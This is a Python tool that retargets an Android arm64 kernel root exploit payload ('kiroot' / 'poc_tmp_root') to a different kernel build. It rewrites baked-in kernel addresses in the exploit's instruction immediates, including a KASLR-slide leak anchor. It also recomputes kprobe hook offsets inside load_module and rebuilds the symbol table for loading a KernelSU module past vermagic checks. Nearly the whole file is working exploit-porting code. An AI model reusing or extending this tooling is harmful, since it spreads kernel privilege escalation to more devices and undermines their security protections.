#!/usr/bin/env python3
"""Retarget kiroot's payload from a 6.12.58 kernel to another build of the same tree.

Inputs
  --image     kernel image of the TARGET build. Raw arm64 Image, or the thin ET_REL
              wrapper (one .data section) made by tools/wrap_image.py.
  --assets    directory holding the reference poc_tmp_root + ksu_patch.txt
  --outdir    where the retargeted payload / table / manifest go

What is build-specific (and therefore what this script rewrites)
  1. ksu_patch.txt : the 225 undefined symbols of assets/kernelsu.ko, resolved by name
                     from the target image's kallsyms (link-time addrs, base 0xffffffc080000000).
  2. poc_tmp_root  : four kprobe site literals `load_module+0xNNNN` (p:m2..p:m5); each sits
                     on the instruction right after a `bl` inside load_module.
  3. poc_tmp_root  : EIGHT link-time kernel addresses baked into code as movz/movn/movk
                     immediates.  A byte/string search cannot see these; the first port
                     attempt (2026-11-27) rewrote only (2) and shipped a payload that still
                     carried 6.12.58 addresses.  See ANCHORS.

Not build-specific
  * `cred+0x40` / `cred+0x42` - struct cred layout (cap_effective at +0x40); 6.12.58 proven
    by the on-device STEP1/STEP3 log lines.
  * `p:m1 load_module`, `p:m6 do_init_module` - resolved by symbol name at run time.
  * `p:m7 complete_formation` - inlined away in both builds; registration fails, non-fatal
    (the symbol is absent from the 6.12.58 device's own kallsyms).
  * kernelsu.ko vermagic is normalised to `6.12.76-4k`; the loader patches the checks.

Exit codes: 0 ok, 2 usage, 3 at least one anchor has no target value.
"""
import argparse
import hashlib
import json
import struct
import sys
from pathlib import Path

HERE = Path(__file__).resolve()
REPO = HERE.parents[4]
DEFAULT_ASSETS = REPO / "originos" / "root" / ".upstream" / "kiroot-apk" / "extracted" / "assets"
DEFAULT_OUT = REPO / "cache" / "scratch" / "kiroot_61281"
DEFAULT_IMAGE = REPO / "cache" / "new.o"

sys.path.insert(0, str(HERE.parent))
from kallsyms2 import Kallsyms                                     # noqa: E402
from kdis import Image                                             # noqa: E402
from capstone import Cs, CS_ARCH_ARM64, CS_MODE_LITTLE_ENDIAN      # noqa: E402
from capstone.arm64 import ARM64_OP_IMM, ARM64_OP_REG              # noqa: E402

BASE = 0xFFFFFFC080000000
MASK64 = (1 << 64) - 1

# bl targets whose return point kiroot hooks inside load_module, in payload order m2..m5
SITE_TARGETS = [
    ("blocking_notifier_call_chain_robust", b"load_module+0x28dc"),  # 6.12.58 value
    ("parse_args", b"load_module+0x2924"),
    ("mod_sysfs_setup", b"load_module+0x2948"),
    ("codetag_load_module", b"load_module+0x2964"),
]

# Link-time kernel addresses baked into poc_tmp_root as instruction immediates.
# `old` is the 6.12.58 (gdd6fd5c98918) value the shipped payload carries.  Only
# load_module is proven, both by the kdis span (0x502688) and by the on-device log line
# `AGG addrfield=... expect_load_module=...` (runtime - slide = 0xffffffc080502688).
ANCHORS = [
    ("load_module",             0xFFFFFFC080502688, "direct",  "seq_run+0x1620"),
    ("kprobe_aggr_pre_handler",  0xFFFFFFC0805509BC, "direct",  "seq_run+0x16dc"),
    ("data_825d7d68",           0xFFFFFFC0825D7D68, "direct",  "seq_run+0x1848"),
    ("data_826d93e0",           0xFFFFFFC0826D93E0, "direct",  "seq_run+0xb34"),
    ("data_826f4550",           0xFFFFFFC0826F4550, "direct",  "seq_run+0xdb4"),
    ("data_8279f6e8",           0xFFFFFFC08279F6E8, "direct",  "seq_run+0x15e0"),
    ("data_827c6519",           0xFFFFFFC0827C6519, "direct",
     "pwn_main+0xd8 / capsel_main+0x16c / modload_main+0xf8 / seq_run+0x214"),
    ("slide_anchor",            0xFFFFFFC0805173E4, "negated", "leak_slide+0x348"),
]
# anchors resolvable from the target image by symbol name (kallsyms has all of them)
SYMBOL_NAMES = {"load_module": "load_module"}


def sha(b):
    return hashlib.sha256(b).hexdigest()


# ------------------------------------------------------------------ 1. symbol table
def build_table(image_path, names):
    img = Path(image_path).read_bytes()
    ks = Kallsyms(image_path)
    pos = img.find(struct.pack("<Q", BASE))
    if pos < 0:
        raise SystemExit("relative_base 0xffffffc080000000 not found")
    p = pos - 4 * ks.N
    if p % 4:
        raise SystemExit(f"offsets array not 4-aligned (0x{p:x})")
    addrs = [BASE + v for v in struct.unpack_from(f"<{ks.N}i", img, p)]
    if addrs[0] != BASE:
        raise SystemExit("offsets[0] != relative_base")
    if any(b < a for a, b in zip(addrs, addrs[1:])):
        raise SystemExit("offsets array is not monotonic")
    syms = {}
    for nm, a in zip(ks.names, addrs):
        syms.setdefault(nm[1:], a)
    missing = [n for n in names if n not in syms]
    if missing:
        raise SystemExit(f"missing symbols in target build: {missing}")
    print(f"[table] N={ks.N} offsets@0x{p:x} relative_base@0x{pos:x} "
          f"gap={pos - (p + 4 * ks.N)} resolved {len(names)}/{len(names)}")
    return syms


# ------------------------------------------------------------------ 2. kprobe sites
def build_sites(image_path, sites):
    img = Image(image_path)
    start, end = img.span("load_module")
    print(f"[sites] load_module 0x{start:x}..0x{end:x} span=0x{end - start:x}")
    calls = {}
    for ins in img.disasm(start, end - start):
        if ins.mnemonic != "bl":
            continue
        for op in ins.operands:
            if op.type != ARM64_OP_IMM:
                continue
            tgt = img.near(op.imm & MASK64)
            if tgt:
                calls.setdefault(tgt[1], []).append(ins.address - start)
    out = {}
    for target, old_lit in sites:
        offs = calls.get(target, [])
        if len(offs) != 1:
            raise SystemExit(f"expected exactly one call to {target} in load_module, got {offs}")
        new_lit = b"load_module+0x%x" % (offs[0] + 4)
        if len(new_lit) != len(old_lit):
            raise SystemExit(f"literal length changed: {old_lit!r} -> {new_lit!r}")
        print(f"[sites] {target:38s} bl+0x{offs[0]:05x} -> site +0x{offs[0] + 4:05x} "
              f"({old_lit.decode()} -> {new_lit.decode()})")
        out[old_lit] = new_lit
    return out


# ------------------------------------------------------------ 3. baked immediates
def elf_layout(payload):
    """(text_va, text_off, text_size, symtab(VAs?), funcs[(va,size,name)]) for the payload."""
    shoff, = struct.unpack_from("<Q", payload, 0x28)
    shentsize, shnum, shstrndx = struct.unpack_from("<HHH", payload, 0x3A)
    shstr = struct.unpack_from("<Q", payload, shoff + shstrndx * shentsize + 24)[0]

    def sname(x):
        s = payload[shstr + x:]
        return s[:s.index(b"\0")].decode()

    secs, order = {}, []
    for i in range(shnum):
        o = shoff + i * shentsize
        nm, typ, flags, addr, off, size = struct.unpack_from("<IIQQQQ", payload, o)
        nm = sname(nm)
        secs[nm] = (addr, off, size)
        order.append(nm)
    text_va, text_off, text_size = secs[".text"]
    sym_va, sym_off, sym_size = secs[".symtab"]
    str_off = secs[".strtab"][1]

    def cstr(off):
        e = payload.index(b"\0", off)
        return payload[off:e].decode("latin1")

    funcs = []
    for i in range(sym_size // 24):
        o = sym_off + i * 24
        nameidx, info, other, shndx, val, size = struct.unpack_from("<IBBHQQ", payload, o)
        if nameidx and (info & 0xF) == 2 and shndx and size:
            funcs.append((val, size, cstr(str_off + nameidx)))
    return (text_va, text_off, text_size), funcs


def scan_anchors(payload, funcs, text):
    """Return {label: [(func, [(file_off, kind, shift, imm16), ...])]} for every anchor."""
    text_va, text_off, text_size = text
    wanted = {}
    for label, old, form, where in ANCHORS:
        wanted[old if form == "direct" else (-old) % (1 << 64)] = label
    md = Cs(CS_ARCH_ARM64, CS_MODE_LITTLE_ENDIAN)
    md.detail = True
    found = {}
    for fva, fsize, fname in funcs:
        if not (text_va <= fva < text_va + text_size):
            continue
        foff = text_off + (fva - text_va)
        state = {}      # reg -> (value, [(file_off, kind, shift, imm16), ...])
        for ins in md.disasm(payload[foff:foff + fsize], fva):
            m, ops = ins.mnemonic, ins.operands
            if m in ("mov", "movz", "movn", "movk") and len(ops) in (2, 3) and ops[0].type == ARM64_OP_REG:
                rd = ops[0].reg
                if ops[1].type == ARM64_OP_REG:
                    state.pop(rd, None)
                    if ops[1].reg in state:
                        state[rd] = state[ops[1].reg]
                    continue
                if ops[1].type != ARM64_OP_IMM:
                    state.pop(rd, None)
                    continue
                imm = ops[1].imm
                sh = getattr(ops[1], "shift", None)
                shift = sh.value if sh is not None and sh.value else 0
                kind = "k" if m == "movk" else ("n" if (m == "movn" or imm < 0) else "z")
                imm16 = ((~imm) if kind == "n" else imm) & 0xFFFF
                prev = state.get(rd, (0, []))[1]
                if kind == "k":
                    value = state.get(rd, (0, []))[0]
                    value = (value & ~(0xFFFF << shift)) | (imm16 << shift)
                    chain = prev + [(text_off + (ins.address - text_va), kind, shift, imm16)]
                elif kind == "n":
                    value = (~(imm16 << shift)) & MASK64
                    chain = [(text_off + (ins.address - text_va), kind, shift, imm16)]
                else:
                    value = (imm16 << shift) & MASK64
                    chain = [(text_off + (ins.address - text_va), kind, shift, imm16)]
                state[rd] = (value, chain)
                if value in wanted:
                    found.setdefault(wanted[value], []).append((fname, fva, chain))
                continue
            for op in ops:
                if op.type == ARM64_OP_REG and op.access and (op.access & 2):
                    state.pop(op.reg, None)
    return found


def patch_chain(payload, chain, new_value):
    """Rewrite one movz/movn/movk run in place so it materialises new_value."""
    out = bytearray(payload)
    for off, kind, shift, _ in chain:
        want = (((~new_value) if kind == "n" else new_value) >> shift) & 0xFFFF
        word = struct.unpack_from("<I", out, off)[0]
        struct.pack_into("<I", out, off, (word & ~(0xFFFF << 5)) | (want << 5))
    return bytes(out)


def simulate(chain_value, chain):
    value = 0
    for _, kind, shift, imm16 in chain:
        if kind == "k":
            value = (value & ~(0xFFFF << shift)) | (imm16 << shift)
        elif kind == "n":
            value = (~(imm16 << shift)) & MASK64
        else:
            value = (imm16 << shift) & MASK64
    return value


# ------------------------------------------------------------------------- driver
def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--image", default=None, help=f"target kernel image (default {DEFAULT_IMAGE})")
    ap.add_argument("--assets", default=str(DEFAULT_ASSETS))
    ap.add_argument("--outdir", default=str(DEFAULT_OUT))
    ap.add_argument("--anchor", action="append", default=[],
                    metavar="LABEL=0xVALUE", help="target-build value for a baked anchor")
    ap.add_argument("--audit", action="store_true",
                    help="only report the baked anchors; do not write a payload")
    args = ap.parse_args()

    src = Path(args.assets)
    payload = (src / "poc_tmp_root").read_bytes()
    text, funcs = elf_layout(payload)
    found = scan_anchors(payload, funcs, text)

    print("[anchors] baked link-time kernel addresses in poc_tmp_root")
    unresolved = []
    values = {}
    for pair in args.anchor:
        label, _, val = pair.partition("=")
        values[label.strip()] = int(val, 0)
    image = Path(args.image) if args.image else (DEFAULT_IMAGE if DEFAULT_IMAGE.exists() else None)
    syms = None
    if image and image.exists():
        syms = Image(str(image)).tab
    for label, old, form, where in ANCHORS:
        hits = found.get(label, [])
        tag = "OK " if hits else "!! MISSING"
        new = values.get(label)
        if new is None and syms is not None and label in SYMBOL_NAMES:
            new = syms.get(SYMBOL_NAMES[label])
        if new is None:
            unresolved.append(label)
        sites = [f"{fn}+0x{text[0] + (ch[0][0] - text[1]) - fva:x}" for fn, fva, ch in hits]
        newtxt = ("0x%016x" % new) if new is not None else "UNRESOLVED"
        print(f"  [{tag}] {label:<24} 0x{old:016x}  {form:<7} {where:<18} "
              f"-> {newtxt:<18} x{len(hits)} {sites if len(hits) > 1 else (sites[0] if sites else '')}")

    if args.audit:
        print(f"[audit] {len(ANCHORS) - len(unresolved)}/{len(ANCHORS)} anchors have a target value")
        return 0 if not unresolved else 3

    if unresolved:
        print(f"[fatal] {len(unresolved)} baked anchor(s) have no target value: {unresolved}")
        print("        the payload cannot be retargeted for this build; supply --anchor LABEL=0x..")
        return 3
    empty = [l for l, *_ in ANCHORS if not found.get(l)]
    if empty:
        raise SystemExit(f"anchor site not found in payload: {empty}")

    out = Path(args.outdir)
    out.mkdir(parents=True, exist_ok=True)
    manifest = {"assets_in": str(src), "image": str(image) if image else None, "changes": []}

    # 3a. baked immediates
    patched = payload
    for label, old, form, where in ANCHORS:
        new = values[label]
        encoded = (-new) % MASK64 if form == "negated" else new
        if form == "negated" and encoded >> 48:
            raise SystemExit(f"{label}: 0x{new:x} cannot be stored as a 48-bit anchor delta "
                             f"(needs bits 48..63 == 0xffff, got 0x{encoded >> 48:x})")
        for fname, fva, chain in found[label]:
            patched = patch_chain(patched, chain, encoded)
            va = text[0] + (chain[0][0] - text[1])
            print(f"[anchors] {label:<24} {fname}+0x{va - fva:x}  0x{old:016x} -> 0x{new:016x}"
                  + (f"   (stored as -anchor = 0x{encoded:x})" if form == "negated" else ""))
        manifest["changes"].append({
            "kind": "imm", "label": label, "form": form, "old": f"0x{old:x}", "new": f"0x{new:x}",
            "stored": f"0x{encoded:x}",
            "sites": [f"{fn}+0x{text[0] + (ch[0][0] - text[1]) - fva:x}" for fn, fva, ch in found[label]],
        })
    # the byte split changes, so re-verify: patched chains must materialise the new value,
    # and the old value must be gone from .text
    for label, old, form, where in ANCHORS:
        want = (-values[label]) % MASK64 if form == "negated" else values[label]
        for fname, fva, chain in found[label]:
            reread = []
            for off, kind, shift, _ in chain:
                word = struct.unpack_from("<I", patched, off)[0]
                reread.append((off, kind, shift, (word >> 5) & 0xFFFF))
            got = simulate(0, reread)
            if got != want:
                raise SystemExit(f"verification failed: {label} re-reads as 0x{got:x}, want 0x{want:x}")
    text2, funcs2 = elf_layout(patched)
    leftover = scan_anchors(patched, funcs2, text2)
    still = [l for l, *_ in ANCHORS if leftover.get(l)]
    if still:
        raise SystemExit(f"verification failed: 6.12.58 value still present for {still}")
    print("[anchors] verification: every patched immediate re-reads as the requested value, "
          "no 6.12.58 anchor remains")

    # 3b. kprobe site literals
    if image and image.exists():
        for old_lit, new_lit in build_sites(image, SITE_TARGETS).items():
            n = patched.count(old_lit)
            if n != 1:
                raise SystemExit(f"{old_lit!r} appears {n} times in payload")
            patched = patched.replace(old_lit, new_lit)
            manifest["changes"].append({"kind": "site", "old": old_lit.decode(),
                                        "new": new_lit.decode()})
    else:
        print("[sites] no --image given: site literals left as 6.12.58 values")
    if len(patched) != len(payload):
        raise SystemExit("payload size changed")

    # 3c. symbol table
    if image and image.exists():
        names = [l.split()[0] for l in (src / "ksu_patch.txt").read_text().splitlines() if l.split()]
        syms = build_table(image, names)
        table = "".join(f"{n} 0x{syms[n]:x}\n" for n in names)
        (out / "ksu_patch.txt").write_bytes(table.encode())
        manifest["ksu_patch.txt"] = {"rows": len(names), "sha256": sha(table.encode())}
    else:
        print("[table] no --image given: ksu_patch.txt not rebuilt")

    (out / "poc_tmp_root").write_bytes(patched)
    manifest["poc_tmp_root"] = {"src_sha256": sha(payload), "out_sha256": sha(patched),
                                "changed_bytes": sum(1 for a, b in zip(payload, patched) if a != b)}
    (out / "retarget-manifest.json").write_text(json.dumps(manifest, indent=2) + "\n", encoding="utf-8")
    print(f"[payload] {sha(payload)[:16]}… -> {sha(patched)[:16]}… "
          f"({manifest['poc_tmp_root']['changed_bytes']} bytes changed)")
    print(f"[done] {out}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
